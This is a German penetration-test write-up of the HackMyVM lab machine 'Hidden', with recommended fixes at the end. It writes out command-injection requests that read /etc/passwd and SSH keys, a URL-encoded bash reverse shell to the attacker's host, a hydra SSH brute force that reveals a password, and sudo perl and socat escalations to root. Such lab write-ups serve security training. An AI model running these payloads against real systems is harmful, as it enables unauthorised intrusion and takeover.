# Hidden (HackMyVM) - Penetration Test Bericht

![Hidden.png](Hidden.png)

**Datum des Berichts:** 10. Oktober 2022  
**VM:** Hidden  
**Plattform:** HackMyVM ([Link zur VM](https://hackmyvm.eu/machines/machine.php?vm=Hidden))  
**Autor der VM:** DarkSpirit  
**Original Writeup:** [https://alientec1908.github.io/Hidden_HackMyVM_Easy/](https://alientec1908.github.io/Hidden_HackMyVM_Easy/)

---

## Disclaimer

**Wichtiger Hinweis:** Dieser Bericht und die darin enthaltenen Informationen dienen ausschließlich zu Bildungs- und Forschungszwecken im Bereich der Cybersicherheit. Die hier beschriebenen Techniken und Werkzeuge dürfen nur in legalen und autorisierten Umgebungen (z.B. auf eigenen Systemen oder mit ausdrücklicher Genehmigung des Eigentümers) angewendet werden. Jegliche illegale Nutzung der hier bereitgestellten Informationen ist strengstens untersagt. Der Autor übernimmt keine Haftung für Schäden, die durch Missbrauch dieser Informationen entstehen. Handeln Sie stets verantwortungsbewusst und ethisch.

---

## Inhaltsverzeichnis

1.  [Zusammenfassung](#zusammenfassung)
2.  [Verwendete Tools](#verwendete-tools)
3.  [Phase 1: Reconnaissance](#phase-1-reconnaissance)
4.  [Phase 2: Web Enumeration (VHosts & RCE)](#phase-2-web-enumeration-vhosts--rce)
5.  [Phase 3: Initial Access (RCE als www-data)](#phase-3-initial-access-rce-als-www-data)
6.  [Phase 4: Privilege Escalation (www-data -> toreto -> atenea -> root)](#phase-4-privilege-escalation-www-data---toreto---atenea---root)
    *   [www-data zu toreto (Sudo/Perl)](#www-data-zu-toreto-sudoperl)
    *   [toreto zu atenea (SSH Brute-Force)](#toreto-zu-atenea-ssh-brute-force)
    *   [atenea zu root (Sudo/Socat)](#atenea-zu-root-sudosocat)
7.  [Proof of Concept (Root)](#proof-of-concept-root)
8.  [Flags](#flags)
9.  [Empfohlene Maßnahmen (Mitigation)](#empfohlene-maßnahmen-mitigation)

---

## Zusammenfassung

Dieser Bericht beschreibt die Kompromittierung der virtuellen Maschine "Hidden" von HackMyVM (Schwierigkeitsgrad: Easy). Die initiale Erkundung identifizierte einen Webserver (Apache) auf Port 80. Durch VHost-Enumeration wurde die Subdomain `sys.hidden.hmv` entdeckt, auf der eine PHP-Anwendung (`/weapon/loot.php`) lief. Diese Anwendung war anfällig für Remote Code Execution (RCE) über den GET-Parameter `hack`. Dies ermöglichte den initialen Zugriff als Benutzer `www-data`.

Die Privilegieneskalation erfolgte in mehreren Schritten:
1.  **www-data zu toreto:** Ausnutzung einer unsicheren `sudo`-Regel, die `www-data` erlaubte, `perl` als `toreto` auszuführen, um eine Shell zu erhalten.
2.  **toreto zu atenea:** Im Home-Verzeichnis von `atenea` wurde eine Wortliste (`atenea.txt`) gefunden. Diese wurde verwendet, um das SSH-Passwort für `atenea` (`sys8423hmv`) erfolgreich per Brute-Force zu ermitteln.
3.  **atenea zu root:** Eine weitere unsichere `sudo`-Regel erlaubte `atenea`, `/usr/bin/socat` als `root` auszuführen, was zur Erlangung einer Root-Shell genutzt wurde.

---

## Verwendete Tools

*   `arp-scan`
*   `nmap`
*   `gobuster` (dir, vhost)
*   `wfuzz`
*   `hydra`
*   `curl` / Webbrowser
*   `nc (netcat)`
*   `python3` (`pty.spawn`, `http.server`)
*   `stty`
*   `sudo`
*   `perl`
*   `sh`
*   `cd`, `ls`, `touch`
*   `wget`
*   `medusa`
*   `ssh`
*   `cat`
*   `socat`
*   `id`
*   `export`
*   `vi`

---

## Phase 1: Reconnaissance

1.  **Netzwerk-Scan:**
    *   `arp-scan -l` identifizierte das Ziel `192.168.2.131` (VirtualBox VM).

2.  **Port-Scan (Nmap):**
    *   Ein umfassender `nmap`-Scan (`nmap -sS -sC -T5 -A 192.168.2.131 -p-`) offenbarte:
        *   **Port 22 (SSH):** OpenSSH 7.9p1 Debian
        *   **Port 80 (HTTP):** Apache httpd 2.4.38 (Debian), Seitentitel "Level 1", Hostname `hidden`.

---

## Phase 2: Web Enumeration (VHosts & RCE)

1.  **VHost-Enumeration:**
    *   `gobuster vhost -u http://hidden.hmv [...]` (und `wfuzz`) identifizierten die Subdomain `sys.hidden.hmv`.
    *   Die `/etc/hosts`-Datei wurde entsprechend angepasst: `192.168.2.131 hidden.hmv sys.hidden.hmv`.

2.  **Verzeichnis-Enumeration auf `sys.hidden.hmv`:**
    *   `gobuster dir -u http://sys.hidden.hmv [...]` fand den Pfad `/weapon/` und die Datei `loot.php`.

3.  **Identifizierung der RCE-Schwachstelle:**
    *   Durch Parameter-Fuzzing (mit `wfuzz`, Details im Log nicht explizit, aber impliziert) wurde der GET-Parameter `hack` für `http://sys.hidden.hmv/weapon/loot.php` gefunden.
    *   Dieser Parameter war anfällig für Remote Code Execution (OS Command Injection). Beispiele:
        *   `loot.php?hack=whoami` -> `www-data`
        *   `loot.php?hack=cat%20/../../../../../../../../etc/passwd%20%7C%20grep%20bash` -> zeigte Benutzer `root`, `atenea`, `toreto`.
        *   `loot.php?hack=cat%20/home/atenea/.ssh/id_rsa.pub` -> enthüllte den öffentlichen SSH-Schlüssel von `atenea`.

---

## Phase 3: Initial Access (RCE als www-data)

1.  **Reverse Shell Payload:**
    *   Eine URL wurde konstruiert, um eine Bash-Reverse-Shell zum Angreifer-System (`192.168.2.140:9001`) zu starten:
        ```
        http://sys.hidden.hmv/weapon/loot.php?hack=%2Fbin%2Fbash%20-c%20%27bash%20-i%20%3E%26%20%2Fdev%2Ftcp%2F192.168.2.140%2F9001%200%3E%261%27
        ```

2.  **Empfang der Shell:**
    *   Ein Netcat-Listener (`nc -lvnp 9001`) auf dem Angreifer-System empfing die Verbindung.
    *   Initialer Zugriff als Benutzer `www-data` wurde erlangt.
    *   Die Shell wurde mit `python3 -c 'import pty; pty.spawn("/bin/bash")'` und `export TERM=xterm` stabilisiert.

---

## Phase 4: Privilege Escalation (www-data -> toreto -> atenea -> root)

### www-data zu toreto (Sudo/Perl)

1.  **Sudo-Rechte-Prüfung für `www-data`:**
    *   `sudo -l` (als `www-data`) zeigte:
        ```
        User www-data may run the following commands on hidden:
            (toreto) NOPASSWD: /usr/bin/perl -e exec "/bin/sh";
        ```
2.  **Ausnutzung:**
    *   `sudo -u toreto perl -e 'exec "/bin/sh";'`
    *   Dies gewährte eine Shell als Benutzer `toreto`. Die Shell wurde ebenfalls stabilisiert.

### toreto zu atenea (SSH Brute-Force)

1.  **Enumeration als `toreto`:**
    *   Im Verzeichnis `/home/atenea/.hidden/` wurde die Datei `atenea.txt` gefunden.
    *   Die Datei wurde mittels eines Python HTTP-Servers (`python3 -m http.server 9999`) von `toreto` zum Angreifer-System transferiert (`wget http://192.168.2.131:9999/atenea.txt`).

2.  **SSH Brute-Force gegen `atenea`:**
    *   Die Datei `atenea.txt` wurde als Wortliste für einen SSH-Brute-Force-Angriff verwendet.
    *   `hydra -t64 ssh://hidden.hmv -l atenea -P atenea.txt` fand das Passwort: `sys8423hmv`.

3.  **Login als `atenea`:**
    *   `ssh atenea@hidden.hmv` mit dem Passwort `sys8423hmv` war erfolgreich.

### atenea zu root (Sudo/Socat)

1.  **Sudo-Rechte-Prüfung für `atenea`:**
    *   `atenea@hidden:~$ sudo -l` zeigte:
        ```
        User atenea may run the following commands on hidden:
            (root) NOPASSWD: /usr/bin/socat
        ```
2.  **Ausnutzung:**
    *   Der Befehl (basierend auf GTFOBins) wurde ausgeführt:
        ```bash
        sudo -u root socat stdin exec:/bin/sh
        ```
    *   Dies startete eine interaktive Shell als `root`.

---

## Proof of Concept (Root)

**Kurzbeschreibung:** Die finale Privilegieneskalation von `atenea` zu `root` erfolgte durch eine unsichere `sudo`-Regel, die es `atenea` erlaubte, `/usr/bin/socat` als `root` ohne Passwort auszuführen. Durch den Befehl `sudo -u root socat stdin exec:/bin/sh` konnte eine interaktive Root-Shell gestartet werden.

**Schritte (als `atenea`):**
1.  Führe den folgenden Befehl aus:
    ```bash
    sudo -u root socat stdin exec:/bin/sh
    ```
2.  Überprüfe die Identität:
    ```bash
    id
    ```
**Ergebnis:** `uid=0(root) gid=0(root) groups=0(root)`. Eine Root-Shell wurde erlangt.

---

## Flags

*   **User Flag (`/home/atenea/user.txt`):**
    ```
    hmv{c4HqWSzRVKNDpTL}
    ```
*   **Root Flag (`/root/root.txt`):**
    ```
    hmv{2Mxtnwrht0ogHB6}
    ```

---

## Empfohlene Maßnahmen (Mitigation)

*   **Webserver-Sicherheit (RCE):**
    *   **DRINGEND:** Beheben Sie die Remote Code Execution (RCE) Schwachstelle in `http://sys.hidden.hmv/weapon/loot.php`. Alle Benutzereingaben (insbesondere GET/POST-Parameter) müssen strikt validiert und saniert werden, bevor sie in Systembefehlen verwendet werden.
    *   Führen Sie regelmäßige Code-Audits durch, um solche Schwachstellen zu identifizieren.
*   **Sudo-Konfiguration:**
    *   **DRINGEND:** Überprüfen und härten Sie alle `sudo`-Regeln.
        *   Entfernen Sie die Regel, die `www-data` erlaubt, `perl` als `toreto` auszuführen.
        *   Entfernen Sie die Regel, die `atenea` erlaubt, `socat` als `root` auszuführen.
    *   Gewähren Sie `sudo`-Rechte nur nach dem Prinzip der geringsten Rechte. Vermeiden Sie `NOPASSWD` und die Erlaubnis, Interpreter oder vielseitige Tools wie `socat` mit erhöhten Rechten auszuführen.
*   **Passwortsicherheit und -management:**
    *   Verhindern Sie die Speicherung von Wortlisten oder potenziellen Passwörtern in Benutzerverzeichnissen (wie `atenea.txt`).
    *   Erzwingen Sie starke, einzigartige Passwörter für alle Benutzer.
    *   Implementieren Sie Mechanismen zur Erkennung und Blockierung von Brute-Force-Angriffen auf SSH (z.B. `fail2ban`).
*   **VHost-Konfiguration:**
    *   Stellen Sie sicher, dass alle konfigurierten virtuellen Hosts (wie `sys.hidden.hmv`) beabsichtigt sind und denselben Sicherheitsstandards unterliegen wie der Haupt-Webserver.
*   **Allgemeine Systemhärtung:**
    *   Überprüfen Sie Dateiberechtigungen in Home-Verzeichnissen und anderen sensiblen Bereichen.

---

**Ben C. - Cyber Security Reports**
